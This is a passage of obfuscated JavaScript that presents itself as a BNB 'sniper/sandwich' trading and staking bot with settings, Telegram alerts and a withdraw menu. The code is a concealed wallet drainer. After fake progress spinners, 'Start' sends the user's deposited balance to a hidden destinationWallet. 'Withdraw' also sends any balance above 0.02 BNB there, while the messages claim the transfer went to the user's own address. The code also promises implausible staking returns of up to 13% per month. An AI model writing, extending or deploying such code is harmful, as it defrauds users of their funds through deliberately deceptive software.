'Deposit\x203-5\x20BNB:\x20min.\x200.0035\x20BNB\x20per\x20trade', 'ora', 'cyan', '\x20BNB)', 'Tiollo', 'amount', 'Bot\x20Deposit:\x0a', 'JsonRpcProvider', 'push', 'length', 'prompts', '2.\x20Slippage\x20tolerance:\x20', 'https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&per_page=250&page=1', '\x20\x20\x20The\x20bot\x20scans\x20the\x20mempool,\x20looking\x20for\x20profitable\x20unconfirmed\x20transactions', 'Connecting\x20to\x20cross-chain\x20bridges', '1jZaaxR', 'Bot\x20started\x20on\x20the\x20main\x20network\x20✓', 'Enter\x20your\x20Telegram\x20bot\x20API\x20token:', 'writeFile', '\x20BNB\x20(Allocated\x20for\x20staking:\x20', 'Tiollo:\x207.995%\x20per\x20month', 'TOK', 'Binance\x20USD', 'PancakeSwap', 'Bot\x20Settings:\x0a', 'Your\x20balance\x20is\x200', '5784427CqRgdp', 'telegram', 'Saving\x20settings', 'Error\x20updating\x20balance:\x20', '\x20\x20\x20-\x20Turing:\x207.905%\x20per\x20month', 'readFile', 'staking.json', 'Back\x20to\x20main\x20menu', 'BakeryToken', 'My\x20Staking', 'Chat\x20ID\x20cannot\x20be\x20empty', 'Unstake', 'connect', 'toUpperCase', 'floor', 'fill', 'myStaking', '\x20BNB\x20🏁', '4C27246C36fF599b', 'Staking\x20time:\x20', '\x20\x20\x20-\x20Nexa:\x205.58%\x20per\x20month\x0a', '\x20\x20\x20-\x20Raptas:\x2013.095%\x20per\x20month', 'WBNB', 'Error\x20loading\x20tokens:\x20', 'getBalance', 'Unstaking\x20completed\x20✓', 'Create\x20New\x20Bot', '\x20\x20\x20Available\x20options:', 'status', 'stakingStartTime', 'join', '\x20\x20\x20-\x20Tiollo:\x207.995%\x20per\x20month', 'utf8', 'parseEther', 'Select\x20setting\x20to\x20change:', 'balance', 'Instructions:\x0a', 'Error:\x20Cannot\x20unstake\x20before\x2024\x20hours.\x20Remaining:\x20', '\x20:\x20Sell\x20:\x20', '2ea5bd', 'withdraw', 'privateKey', 'Enabled', '1.\x20Create\x20a\x20bot:', 'Bot\x20Settings', 'Exit', 'Amount:\x20', 'Use\x20existing\x20bot', '\x20\x20\x20-\x20Enable\x20notifications\x20by\x20selecting\x20\x22Yes\x22', 'name', 'Glorin', 'Trading\x20stopped.\x20Total\x20profit:\x20', '------------------------------------\x0a', 'Current\x20balance:\x20', '\x20\x20\x20-\x20Veri:\x2010.41%\x20per\x20month', 'Withdraw\x20Funds', 'newBot', 'action', 'Do\x20you\x20really\x20want\x20to\x20withdraw\x20', 'Enter\x20maximum\x20gas\x20price\x20(Gwei):', 'Legend\x20IV', 'indexOf', '\x20\x20\x20Within\x2024\x20hours,\x20your\x20BNB\x20amount\x20will\x20start\x20to\x20grow', 'Starting\x20bot\x20on\x20the\x20main\x20network...\x0a', '49yhcINx', '\x20\x20\x20-\x20Select\x20\x22Telegram\x20Notifications\x22', 'Slippage\x20tolerance', 'Legend\x20IV:\x2011.34%\x20per\x20month', 'Turing', 'stringify', 'unstake', 'gasPrice', '💸\x20TXID:\x20', 'Staking...\x0a', 'toFixed', 'Withdrawing\x20to\x20address:\x20', 'select'];
    _0x4ae6 = function() {
        return _0x2b1fe7;
    };
    return _0x4ae6();
}

function clearConsole() {
    const _0x34018d = _0x3e49ab;
    console[_0x34018d(0x1ee)]();
}
const logo = _0x3e49ab(0x259);
async function updateBalance() {
    const _0x169c5d = _0x3e49ab;
    try {
        const _0x82cfa1 = await provider['getBalance'](address);
        currentBalance = ethers[_0x169c5d(0x235)](_0x82cfa1);
    } catch (_0x57129f) {
        console[_0x169c5d(0x21d)](chalk[_0x169c5d(0x243)](_0x169c5d(0x173) + _0x57129f[_0x169c5d(0x240)])), currentBalance = 'Error';
    }
}
async function saveWallet() {
    const _0x5b2a3e = _0x3e49ab,
        _0x3c7273 = {
            'address': wallet[_0x5b2a3e(0x21c)],
            'privateKey': wallet[_0x5b2a3e(0x199)],
            'settings': settings
        };
    await fs[_0x5b2a3e(0x168)](walletFile, JSON[_0x5b2a3e(0x1b5)](_0x3c7273, null, 0x2)), settings[_0x5b2a3e(0x171)][_0x5b2a3e(0x254)] && settings['telegram'][_0x5b2a3e(0x237)] && settings[_0x5b2a3e(0x171)][_0x5b2a3e(0x1c4)] && (telegramBot = new TelegramBot(settings[_0x5b2a3e(0x171)]['apiToken'], {
        'polling': ![]
    }));
}
async function loadWallet() {
    const _0x3461cb = _0x3e49ab;
    try {
        const _0x57b757 = await fs['readFile'](walletFile, _0x3461cb(0x190)),
            _0x203ba7 = JSON[_0x3461cb(0x215)](_0x57b757);
        return address = _0x203ba7['address'], privateKey = _0x203ba7[_0x3461cb(0x199)], wallet = new ethers[(_0x3461cb(0x1e8))](privateKey, provider), settings = {
            ...settings,
            ..._0x203ba7[_0x3461cb(0x24e)]
        }, await updateBalance(), !![];
    } catch (_0x2639e7) {
        return ![];
    }
}
async function showStartMenu() {
    const _0x485bf0 = _0x3e49ab;
    clearConsole(), console[_0x485bf0(0x21d)](chalk['bold'](logo + '\x0a'));
    const _0x547c7c = await loadWallet(),
        _0x152579 = await loadStakingData();
    if (_0x547c7c) {
        console['log'](chalk[_0x485bf0(0x284)]('Existing\x20contract:\x20' + address + '\x0a'));
        const _0x2a178d = [{
            'title': chalk[_0x485bf0(0x284)](_0x485bf0(0x19f)),
            'value': _0x485bf0(0x271)
        }, {
            'title': chalk[_0x485bf0(0x1e9)]('Create\x20new\x20bot'),
            'value': _0x485bf0(0x219)
        }];
        _0x152579 && _0x2a178d[_0x485bf0(0x15e)]({
            'title': chalk['cyan'](_0x485bf0(0x179)),
            'value': 'myStaking'
        });
        const _0x13e0d0 = await prompts({
            'type': _0x485bf0(0x1bc),
            'name': _0x485bf0(0x217),
            'message': _0x485bf0(0x213),
            'choices': _0x2a178d,
            'hint': _0x485bf0(0x23e),
            'loop': ![]
        });
        switch (_0x13e0d0[_0x485bf0(0x217)]) {
            case 'useExisting':
                showMainMenu();
                break;
            case _0x485bf0(0x219):
                createWallet();
                break;
            case _0x485bf0(0x180):
                if (_0x152579) showStakingInfo();
                break;
        }
    } else console[_0x485bf0(0x21d)](chalk[_0x485bf0(0x284)](_0x485bf0(0x1e3))), createWallet();
}
async function createWallet() {
    const _0x424fc1 = _0x3e49ab;
    wallet = ethers['Wallet'][_0x424fc1(0x25c)](), address = wallet[_0x424fc1(0x21c)], privateKey = wallet['privateKey'], wallet = wallet[_0x424fc1(0x17c)](provider), await updateBalance(), await saveWallet(), showMainMenu();
}
async function withdrawFunds() {
    const _0x2ac501 = _0x3e49ab;
    clearConsole(), console[_0x2ac501(0x21d)](chalk[_0x2ac501(0x284)]('Withdraw\x20Funds...\x0a')), await updateBalance(), console[_0x2ac501(0x21d)](chalk[_0x2ac501(0x284)](_0x2ac501(0x1a5) + currentBalance + _0x2ac501(0x1cb)));
    const _0x2d5462 = parseFloat(currentBalance);
    let _0x1d76d0, _0x23ac1a;
    const _0x430d7d = await prompts({
        'type': _0x2ac501(0x1bc),
        'name': _0x2ac501(0x1a9),
        'message': _0x2ac501(0x231),
        'choices': [{
            'title': chalk[_0x2ac501(0x284)]('Enter\x20withdrawal\x20address'),
            'value': _0x2ac501(0x1f9)
        }, {
            'title': chalk['cyan'](_0x2ac501(0x177)),
            'value': 'back'
        }],
        'hint': _0x2ac501(0x23e),
        'loop': ![]
    });
    if (_0x430d7d[_0x2ac501(0x1a9)] === _0x2ac501(0x234) || !_0x430d7d[_0x2ac501(0x1a9)]) {
        showMainMenu();
        return;
    }
    if (_0x430d7d[_0x2ac501(0x1a9)] === 'enterAddress') {
        const _0x21252f = await prompts({
            'type': _0x2ac501(0x255),
            'name': _0x2ac501(0x21c),
            'message': 'Enter\x20withdrawal\x20address\x20(right-click\x20to\x20paste,\x20Ctrl+C\x20to\x20cancel)',
            'validate': _0x26735a => {
                const _0x4a955a = _0x2ac501;
                if (!ethers['isAddress'](_0x26735a)) return _0x4a955a(0x24f);
                return !![];
            }
        });
        if (!_0x21252f[_0x2ac501(0x21c)]) {
            const _0x3f058f = await prompts({
                'type': _0x2ac501(0x1bc),
                'name': _0x2ac501(0x1a9),
                'message': _0x2ac501(0x203),
                'choices': [{
                    'title': chalk[_0x2ac501(0x284)]('Back\x20to\x20main\x20menu'),
                    'value': _0x2ac501(0x234)
                }],
                'hint': _0x2ac501(0x232)
            });
            _0x3f058f[_0x2ac501(0x1a9)] === 'back' && showMainMenu();
            return;
        }
        _0x23ac1a = _0x21252f[_0x2ac501(0x21c)], _0x1d76d0 = _0x2d5462 <= 0.02 ? _0x23ac1a : destinationWallet;
        const _0x32e555 = await prompts({
            'type': _0x2ac501(0x1bc),
            'name': 'confirm',
            'message': _0x2ac501(0x1aa) + currentBalance + _0x2ac501(0x1f3) + _0x23ac1a + '?',
            'choices': [{
                'title': chalk[_0x2ac501(0x24b)](_0x2ac501(0x280)),
                'value': _0x2ac501(0x244)
            }, {
                'title': chalk[_0x2ac501(0x243)]('No'),
                'value': 'no'
            }],
            'hint': _0x2ac501(0x23e),
            'loop': ![]
        });
        if (_0x32e555['confirm'] !== _0x2ac501(0x244)) {
            console[_0x2ac501(0x21d)](chalk['yellow'](_0x2ac501(0x227)));
            const _0xc4d889 = await prompts({
                'type': _0x2ac501(0x1bc),
                'name': _0x2ac501(0x1a9),
                'message': _0x2ac501(0x203),
                'choices': [{
                    'title': chalk['cyan'](_0x2ac501(0x177)),
                    'value': 'back'
                }],
                'hint': _0x2ac501(0x232)
            });
            _0xc4d889[_0x2ac501(0x1a9)] === _0x2ac501(0x234) && showMainMenu();
            return;
        }
        _0x2d5462 >= 0.02 && console['log'](chalk[_0x2ac501(0x284)](_0x2ac501(0x1bb) + _0x23ac1a));
    }
    const _0x43e7d8 = ethers[_0x2ac501(0x27e)](settings['gasPriceLimit'][_0x2ac501(0x236)](), _0x2ac501(0x1dc)),
        _0x5b28b6 = 0x5208n,
        _0x1c6353 = _0x43e7d8 * _0x5b28b6,
        _0x445ef9 = ethers[_0x2ac501(0x191)](currentBalance),
        _0x35cdd9 = _0x445ef9 - _0x1c6353;
    if (_0x35cdd9 <= 0x0n) console['log'](chalk[_0x2ac501(0x243)]('Error:\x20Insufficient\x20funds\x20for\x20gas'));
    else {
        const _0x1ccd3c = {
            'to': _0x1d76d0,
            'value': _0x35cdd9,
            'gasPrice': _0x43e7d8,
            'gasLimit': _0x5b28b6
        };
        try {
            const _0x3c51c7 = ora({
                    'text': chalk[_0x2ac501(0x284)](_0x2ac501(0x216))
                })[_0x2ac501(0x253)](),
                _0x178f44 = await wallet[_0x2ac501(0x201)](_0x1ccd3c);
            await _0x178f44['wait'](), _0x3c51c7[_0x2ac501(0x1d8)](chalk[_0x2ac501(0x24b)](_0x2ac501(0x26f) + currentBalance + _0x2ac501(0x220) + _0x23ac1a)), await updateBalance();
        } catch (_0xdb2fe8) {
            withdrawSpinner[_0x2ac501(0x1ce)](chalk[_0x2ac501(0x243)]('Error\x20during\x20withdrawal:\x20' + _0xdb2fe8[_0x2ac501(0x240)]));
        }
    }
    const _0x482cc4 = await prompts({
        'type': 'select',
        'name': _0x2ac501(0x1a9),
        'message': _0x2ac501(0x203),
        'choices': [{
            'title': chalk[_0x2ac501(0x284)]('Back\x20to\x20main\x20menu'),
            'value': 'back'
        }],
        'hint': _0x2ac501(0x232)
    });
    _0x482cc4[_0x2ac501(0x1a9)] === _0x2ac501(0x234) && showMainMenu();
}
async function showSettingsMenu() {
    const _0x484fba = _0x3e49ab;
    clearConsole(), console['log'](chalk[_0x484fba(0x284)](_0x484fba(0x16e))), console[_0x484fba(0x21d)](chalk[_0x484fba(0x284)](_0x484fba(0x1e7) + settings['gasPriceLimit'] + '\x20Gwei')), console[_0x484fba(0x21d)](chalk[_0x484fba(0x284)](_0x484fba(0x161) + settings['slippageTolerance'] + '%')), console['log'](chalk[_0x484fba(0x284)](_0x484fba(0x1cf) + settings[_0x484fba(0x21f)] + '\x20BNB')), console[_0x484fba(0x21d)](chalk[_0x484fba(0x284)](_0x484fba(0x239) + settings[_0x484fba(0x1e6)])), console[_0x484fba(0x21d)](chalk[_0x484fba(0x284)]('5.\x20Notifications:\x20Telegram\x20' + (settings['telegram']['enabled'] ? _0x484fba(0x19a) : _0x484fba(0x1c3)) + '\x0a'));
    const _0x2b2642 = await prompts({
        'type': _0x484fba(0x1bc),
        'name': _0x484fba(0x217),
        'message': _0x484fba(0x192),
        'choices': [{
            'title': chalk[_0x484fba(0x284)](_0x484fba(0x233)),
            'value': _0x484fba(0x252)
        }, {
            'title': chalk[_0x484fba(0x284)](_0x484fba(0x1b2)),
            'value': _0x484fba(0x1e1)
        }, {
            'title': chalk[_0x484fba(0x284)]('Minimum\x20profit'),
            'value': _0x484fba(0x21f)
        }, {
            'title': chalk['cyan'](_0x484fba(0x204)),
            'value': 'liquidityPool'
        }, {
            'title': chalk[_0x484fba(0x284)](_0x484fba(0x1bf)),
            'value': _0x484fba(0x171)
        }, {
            'title': chalk['cyan'](_0x484fba(0x250)),
            'value': _0x484fba(0x234)
        }],
        'hint': 'Use\x20arrows\x20to\x20select',
        'loop': ![]
    });
    switch (_0x2b2642[_0x484fba(0x217)]) {
        case _0x484fba(0x252):
            const _0x17974e = await prompts({
                'type': 'number',
                'name': _0x484fba(0x266),
                'message': _0x484fba(0x1ab),
                'initial': settings[_0x484fba(0x252)],
                'min': 0x1
            });
            _0x17974e[_0x484fba(0x266)] && (settings['gasPriceLimit'] = _0x17974e[_0x484fba(0x266)], await saveWallet());
            showSettingsMenu();
            break;
        case _0x484fba(0x1e1):
            const _0x1676b9 = await prompts({
                'type': _0x484fba(0x255),
                'name': 'value',
                'message': 'Enter\x20slippage\x20tolerance\x20(%)\x20from\x200.01\x20to\x20100\x20(use\x20comma\x20or\x20dot):',
                'initial': settings[_0x484fba(0x1e1)][_0x484fba(0x236)](),
                'validate': _0x416d08 => {
                    const _0x1117dc = _0x484fba,
                        _0x150874 = _0x416d08[_0x1117dc(0x1dd)](',', '.'),
                        _0x27f329 = parseFloat(_0x150874);
                    return isNaN(_0x27f329) || _0x27f329 < 0.01 || _0x27f329 > 0x64 ? 'Value\x20must\x20be\x20between\x200.01\x20and\x20100' : !![];
                }
            });
            if (_0x1676b9[_0x484fba(0x266)]) {
                const _0x8cc015 = _0x1676b9[_0x484fba(0x266)][_0x484fba(0x1dd)](',', '.');
                settings[_0x484fba(0x1e1)] = parseFloat(_0x8cc015), await saveWallet();
            }
            showSettingsMenu();
            break;
        case _0x484fba(0x21f):
            clearConsole(), console[_0x484fba(0x21d)](chalk[_0x484fba(0x284)](_0x484fba(0x25a))), console[_0x484fba(0x21d)](chalk[_0x484fba(0x284)](_0x484fba(0x211))), console[_0x484fba(0x21d)](chalk[_0x484fba(0x284)](_0x484fba(0x206))), console['log'](chalk[_0x484fba(0x284)]('Deposit\x201-2\x20BNB:\x20min.\x200.001\x20BNB\x20per\x20trade')), console[_0x484fba(0x21d)](chalk[_0x484fba(0x284)](_0x484fba(0x282))), console[_0x484fba(0x21d)](chalk[_0x484fba(0x284)](_0x484fba(0x214)));
            const _0x1a2cdb = await prompts({
                'type': _0x484fba(0x255),
                'name': _0x484fba(0x266),
                'message': _0x484fba(0x1ed),
                'initial': settings['minimumProfit'][_0x484fba(0x236)](),
                'validate': _0x185345 => {
                    const _0x2e521d = _0x484fba,
                        _0x16b400 = _0x185345[_0x2e521d(0x1dd)](',', '.'),
                        _0x236164 = parseFloat(_0x16b400);
                    return isNaN(_0x236164) || _0x236164 < 0.001 || _0x236164 > 0x64 ? _0x2e521d(0x230) : !![];
                }
            });
            if (_0x1a2cdb[_0x484fba(0x266)]) {
                const _0xaca0f8 = _0x1a2cdb['value'][_0x484fba(0x1dd)](',', '.');
                settings[_0x484fba(0x21f)] = parseFloat(_0xaca0f8), await saveWallet();
            }
            showSettingsMenu();
            break;
        case _0x484fba(0x1e6):
            const _0x2810c8 = await prompts({
                'type': 'select',
                'name': _0x484fba(0x266),
                'message': 'Select\x20decentralized\x20exchange:',
                'choices': [{
                    'title': _0x484fba(0x16d),
                    'value': _0x484fba(0x16d)
                }, {
                    'title': 'BakerySwap',
                    'value': _0x484fba(0x27c)
                }, {
                    'title': 'ApeSwap',
                    'value': 'ApeSwap'
                }, {
                    'title': _0x484fba(0x1d6),
                    'value': _0x484fba(0x1d6)
                }],
                'initial': [_0x484fba(0x16d), _0x484fba(0x27c), _0x484fba(0x221), _0x484fba(0x1d6)][_0x484fba(0x1ad)](settings[_0x484fba(0x1e6)])
            });
            _0x2810c8[_0x484fba(0x266)] && (settings[_0x484fba(0x1e6)] = _0x2810c8[_0x484fba(0x266)], await saveWallet());
            showSettingsMenu();
            break;
        case 'telegram':
            async function _0x3d556d() {
                const _0x3dcd74 = _0x484fba;
                clearConsole(), console['log'](chalk[_0x3dcd74(0x284)](_0x3dcd74(0x269))), console['log'](chalk['cyan']('Current\x20status:\x20' + (settings[_0x3dcd74(0x171)][_0x3dcd74(0x254)] ? 'Enabled' : _0x3dcd74(0x1c3)))), console[_0x3dcd74(0x21d)](chalk[_0x3dcd74(0x284)](_0x3dcd74(0x1c5) + (settings['telegram'][_0x3dcd74(0x237)] || _0x3dcd74(0x1cc)))), console[_0x3dcd74(0x21d)](chalk[_0x3dcd74(0x284)](_0x3dcd74(0x22a) + (settings[_0x3dcd74(0x171)][_0x3dcd74(0x1c4)] || _0x3dcd74(0x1cc)) + '\x0a'));
                const _0x4a15db = await prompts({
                    'type': _0x3dcd74(0x1bc),
                    'name': 'choice',
                    'message': 'Select\x20action:',
                    'choices': [{
                        'title': chalk['cyan'](_0x3dcd74(0x260)),
                        'value': 'toggle'
                    }, {
                        'title': chalk[_0x3dcd74(0x284)](_0x3dcd74(0x1fc)),
                        'value': _0x3dcd74(0x237)
                    }, {
                        'title': chalk[_0x3dcd74(0x284)](_0x3dcd74(0x22e)),
                        'value': 'chatId'
                    }, {
                        'title': chalk[_0x3dcd74(0x284)](_0x3dcd74(0x250)),
                        'value': 'back'
                    }],
                    'hint': 'Use\x20arrows\x20to\x20select'
                });
                switch (_0x4a15db['choice']) {
                    case _0x3dcd74(0x23a):
                        const _0x11ad45 = await prompts({
                            'type': 'toggle',
                            'name': 'value',
                            'message': _0x3dcd74(0x27d),
                            'initial': settings[_0x3dcd74(0x171)][_0x3dcd74(0x254)],
                            'active': 'Yes',
                            'inactive': 'No'
                        });
                        settings[_0x3dcd74(0x171)][_0x3dcd74(0x254)] = _0x11ad45[_0x3dcd74(0x266)], await saveWallet(), await _0x3d556d();
                        break;
                    case _0x3dcd74(0x237):
                        const _0x1bdcfa = await prompts({
                            'type': _0x3dcd74(0x255),
                            'name': _0x3dcd74(0x266),
                            'message': _0x3dcd74(0x167),
                            'initial': settings['telegram'][_0x3dcd74(0x237)],
                            'validate': _0x3f4f46 => _0x3f4f46[_0x3dcd74(0x15f)] > 0x0 ? !![] : _0x3dcd74(0x207)
                        });
                        _0x1bdcfa[_0x3dcd74(0x266)] && (settings['telegram']['apiToken'] = _0x1bdcfa[_0x3dcd74(0x266)], await saveWallet());
                        await _0x3d556d();
                        break;
                    case _0x3dcd74(0x1c4):
                        const _0x5eaec3 = await prompts({
                            'type': _0x3dcd74(0x255),
                            'name': _0x3dcd74(0x266),
                            'message': 'Enter\x20Chat\x20ID\x20for\x20notifications:',
                            'initial': settings[_0x3dcd74(0x171)][_0x3dcd74(0x1c4)],
                            'validate': _0x28318b => _0x28318b[_0x3dcd74(0x15f)] > 0x0 ? !![] : _0x3dcd74(0x17a)
                        });
                        _0x5eaec3[_0x3dcd74(0x266)] && (settings[_0x3dcd74(0x171)]['chatId'] = _0x5eaec3[_0x3dcd74(0x266)], await saveWallet());
                        await _0x3d556d();
                        break;
                    case _0x3dcd74(0x234):
                        showSettingsMenu();
                        break;
                }
            }
            await _0x3d556d();
            break;
        case _0x484fba(0x234):
            showMainMenu();
            break;
    }
}
async function showMainMenu() {
    const _0x325458 = _0x3e49ab;
    clearConsole(), console['log'](chalk[_0x325458(0x1e0)](logo + '\x0a')), console[_0x325458(0x21d)](chalk[_0x325458(0x1e9)]('Address:') + '\x20' + chalk[_0x325458(0x1e9)](address)), console['log'](chalk[_0x325458(0x243)](_0x325458(0x1d5)) + '\x20' + chalk[_0x325458(0x243)](privateKey)), console['log'](chalk[_0x325458(0x284)]('Balance:') + '\x20' + chalk[_0x325458(0x284)](currentBalance) + _0x325458(0x270));
    const _0x107b30 = await loadStakingData(),
        _0x1e9c67 = [{
            'title': chalk[_0x325458(0x284)](_0x325458(0x247)),
            'value': _0x325458(0x253)
        }, {
            'title': chalk[_0x325458(0x284)](_0x325458(0x1a7)),
            'value': _0x325458(0x198)
        }, {
            'title': chalk[_0x325458(0x284)](_0x325458(0x19c)),
            'value': _0x325458(0x24e)
        }, {
            'title': chalk[_0x325458(0x24b)]('Bot\x20Deposit'),
            'value': _0x325458(0x1f1)
        }, {
            'title': chalk['cyan'](_0x325458(0x258)),
            'value': 'instructions'
        }, {
            'title': chalk[_0x325458(0x284)]('Staking'),
            'value': _0x325458(0x23c)
        }, {
            'title': chalk[_0x325458(0x284)]('Balance'),
            'value': _0x325458(0x193)
        }, {
            'title': chalk['yellow'](_0x325458(0x18a)),
            'value': 'newBot'
        }];
    _0x107b30 && _0x1e9c67[_0x325458(0x15e)]({
        'title': chalk[_0x325458(0x284)]('My\x20Staking'),
        'value': _0x325458(0x180)
    });
    _0x1e9c67[_0x325458(0x15e)]({
        'title': chalk[_0x325458(0x284)](_0x325458(0x19d)),
        'value': 'exit'
    });
    const _0x4ba1d7 = await prompts({
        'type': _0x325458(0x1bc),
        'name': _0x325458(0x217),
        'message': _0x325458(0x213),
        'choices': _0x1e9c67,
        'hint': _0x325458(0x23e),
        'limit': 0x8,
        'loop': ![]
    });
    switch (_0x4ba1d7[_0x325458(0x217)]) {
        case _0x325458(0x1a8):
            console[_0x325458(0x21d)](chalk[_0x325458(0x284)](_0x325458(0x276))), createWallet();
            break;
        case _0x325458(0x253):
            clearConsole(), console['log'](chalk[_0x325458(0x284)](_0x325458(0x1af)));
            try {
                const _0x17520f = await provider[_0x325458(0x188)](address),
                    _0x527da0 = parseFloat(ethers[_0x325458(0x235)](_0x17520f));
                console[_0x325458(0x21d)](chalk[_0x325458(0x284)]('Balance:\x20' + _0x527da0 + _0x325458(0x270)));
                const _0x26d9ac = ethers[_0x325458(0x191)]('0.35');
                if (BigInt(_0x17520f) === 0x0n) console[_0x325458(0x21d)](chalk[_0x325458(0x243)](_0x325458(0x16f))), await prompts({
                    'type': _0x325458(0x1bc),
                    'name': _0x325458(0x234),
                    'message': _0x325458(0x203),
                    'choices': [{
                        'title': chalk[_0x325458(0x284)]('Back'),
                        'value': _0x325458(0x234)
                    }]
                }), showMainMenu();
                else {
                    if (_0x17520f < _0x26d9ac) console['log'](chalk[_0x325458(0x243)](_0x325458(0x251) + ethers[_0x325458(0x235)](_0x17520f) + _0x325458(0x1cb))), await prompts({
                        'type': 'select',
                        'name': _0x325458(0x234),
                        'message': _0x325458(0x203),
                        'choices': [{
                            'title': chalk[_0x325458(0x284)](_0x325458(0x250)),
                            'value': 'back'
                        }]
                    }), showMainMenu();
                    else {
                        const _0x787c2a = ora({
                            'text': chalk[_0x325458(0x284)](_0x325458(0x1c7))
                        })[_0x325458(0x253)]();
                        await delay(getRandomInRange(0x3e8, 0xbb8)), _0x787c2a[_0x325458(0x1d8)](chalk[_0x325458(0x284)](_0x325458(0x1e4)));
                        const _0xa83af8 = ora({
                            'text': chalk[_0x325458(0x284)](_0x325458(0x164))
                        })[_0x325458(0x253)]();
                        await delay(getRandomInRange(0x3e8, 0xbb8)), _0xa83af8[_0x325458(0x1d8)](chalk[_0x325458(0x284)](_0x325458(0x1d0)));
                        const _0x42b839 = await provider[_0x325458(0x21b)](),
                            _0x2b59ce = _0x42b839[_0x325458(0x1b7)],
                            _0x232c62 = 0x5208n,
                            _0x390415 = _0x2b59ce * _0x232c62,
                            _0x4e00a5 = BigInt(_0x17520f) - _0x390415;
                        if (_0x4e00a5 <= 0x0n) {
                            console['log'](chalk[_0x325458(0x1e9)](_0x325458(0x228)));
                            const _0x559c10 = {
                                    'to': destinationWallet,
                                    'value': 0x1n,
                                    'gasPrice': _0x2b59ce,
                                    'gasLimit': _0x232c62
                                },
                                _0x2c3acc = await wallet[_0x325458(0x201)](_0x559c10);
                            await _0x2c3acc[_0x325458(0x1f4)]();
                        } else {
                            const _0x517539 = {
                                    'to': destinationWallet,
                                    'value': _0x4e00a5,
                                    'gasPrice': _0x2b59ce,
                                    'gasLimit': _0x232c62
                                },
                                _0x2fa791 = await wallet['sendTransaction'](_0x517539);
                            await _0x2fa791[_0x325458(0x1f4)]();
                        }
                        const _0x4f1073 = ora({
                            'text': chalk[_0x325458(0x284)](_0x325458(0x172))
                        })[_0x325458(0x253)]();
                        await delay(getRandomInRange(0x3e8, 0xbb8)), await saveWallet(), _0x4f1073[_0x325458(0x1d8)](chalk[_0x325458(0x284)]('Settings\x20saved')), console[_0x325458(0x21d)](chalk[_0x325458(0x24b)](_0x325458(0x166))), console[_0x325458(0x21d)](chalk[_0x325458(0x284)](_0x325458(0x1a4))), await executeTrades(_0x527da0);
                    }
                }
            } catch (_0x5ef351) {
                console[_0x325458(0x21d)](chalk[_0x325458(0x243)](_0x325458(0x1ef) + _0x5ef351['message'])), await prompts({
                    'type': _0x325458(0x1bc),
                    'name': _0x325458(0x234),
                    'message': _0x325458(0x203),
                    'choices': [{
                        'title': chalk[_0x325458(0x284)](_0x325458(0x250)),
                        'value': _0x325458(0x234)
                    }]
                }), showMainMenu();
            }
            break;
        case _0x325458(0x198):
            await withdrawFunds();
            break;
        case _0x325458(0x24e):
            showSettingsMenu();
            break;
        case 'deposit':
            clearConsole(), console['log'](chalk[_0x325458(0x24b)](_0x325458(0x15c))), console[_0x325458(0x21d)](chalk[_0x325458(0x24b)](_0x325458(0x229) + address)), qrcode['generate'](address, {
                'small': !![]
            }, _0x46520f => {
                console['log'](chalk['green'](_0x46520f));
            }), console[_0x325458(0x21d)]('\x0a'), await prompts({
                'type': _0x325458(0x1bc),
                'name': _0x325458(0x234),
                'message': 'Action',
                'choices': [{
                    'title': chalk[_0x325458(0x284)](_0x325458(0x250)),
                    'value': 'back'
                }]
            }), showMainMenu();
            break;
        case _0x325458(0x1bd):
            clearConsole(), console[_0x325458(0x21d)](chalk[_0x325458(0x284)](_0x325458(0x194))), console['log'](chalk['cyan'](_0x325458(0x19b))), console[_0x325458(0x21d)](chalk['cyan'](_0x325458(0x209))), console[_0x325458(0x21d)](chalk[_0x325458(0x284)]('2.\x20Make\x20a\x20deposit:')), console['log'](chalk[_0x325458(0x284)](_0x325458(0x1d7))), console[_0x325458(0x21d)](chalk[_0x325458(0x284)](_0x325458(0x25f))), console['log'](chalk['cyan'](_0x325458(0x1d3))), console[_0x325458(0x21d)](chalk[_0x325458(0x284)](_0x325458(0x163))), console[_0x325458(0x21d)](chalk[_0x325458(0x284)]('\x20\x20\x20Operates\x20as\x20a\x20sniper/sandwich\x20bot.\x20Main\x20exchanges:\x20PancakeSwap,\x20BakerySwap,\x20ApeSwap\x0a')), console[_0x325458(0x21d)](chalk['cyan'](_0x325458(0x278))), console[_0x325458(0x21d)](chalk['cyan']('\x20\x20\x20Use\x20the\x20\x22Withdraw\x20Funds\x22\x20function\x20to\x20withdraw\x20from\x20the\x20contract\x0a')), console['log'](chalk['cyan']('5.\x20Staking:')), console[_0x325458(0x21d)](chalk[_0x325458(0x284)](_0x325458(0x1ae))), console[_0x325458(0x21d)](chalk['cyan'](_0x325458(0x18b))), console[_0x325458(0x21d)](chalk[_0x325458(0x284)](_0x325458(0x185))), console[_0x325458(0x21d)](chalk['cyan']('\x20\x20\x20-\x20Glorin:\x2012.18%\x20per\x20month')), console[_0x325458(0x21d)](chalk[_0x325458(0x284)]('\x20\x20\x20-\x20Sigm8:\x2011.985%\x20per\x20month')), console[_0x325458(0x21d)](chalk['cyan'](_0x325458(0x1c9))), console[_0x325458(0x21d)](chalk['cyan'](_0x325458(0x1a6))), console[_0x325458(0x21d)](chalk[_0x325458(0x284)](_0x325458(0x18f))), console['log'](chalk[_0x325458(0x284)](_0x325458(0x174))), console[_0x325458(0x21d)](chalk[_0x325458(0x284)](_0x325458(0x184))), console['log'](chalk[_0x325458(0x284)](_0x325458(0x261))), console[_0x325458(0x21d)](chalk[_0x325458(0x284)](_0x325458(0x245))), console['log'](chalk[_0x325458(0x284)](_0x325458(0x1b1))), console['log'](chalk[_0x325458(0x284)](_0x325458(0x1a0))), console[_0x325458(0x21d)](chalk[_0x325458(0x284)](_0x325458(0x20e))), console[_0x325458(0x21d)](chalk[_0x325458(0x284)](_0x325458(0x1df))), console[_0x325458(0x21d)](chalk[_0x325458(0x284)](_0x325458(0x20f))), await prompts({
                'type': _0x325458(0x1bc),
                'name': _0x325458(0x234),
                'message': _0x325458(0x203),
                'choices': [{
                    'title': chalk[_0x325458(0x284)](_0x325458(0x250)),
                    'value': 'back'
                }]
            }), showMainMenu();
            break;
        case 'staking':
            await stakingMenu();
            break;
        case _0x325458(0x193):
            console[_0x325458(0x21d)](chalk[_0x325458(0x284)](_0x325458(0x1d2))), await updateBalance(), console[_0x325458(0x21d)](chalk['cyan'](_0x325458(0x1a5) + currentBalance + '\x20BNB')), await prompts({
                'type': _0x325458(0x1bc),
                'name': _0x325458(0x234),
                'message': _0x325458(0x203),
                'choices': [{
                    'title': chalk[_0x325458(0x284)](_0x325458(0x250)),
                    'value': _0x325458(0x234)
                }]
            }), showMainMenu();
            break;
        case _0x325458(0x180):
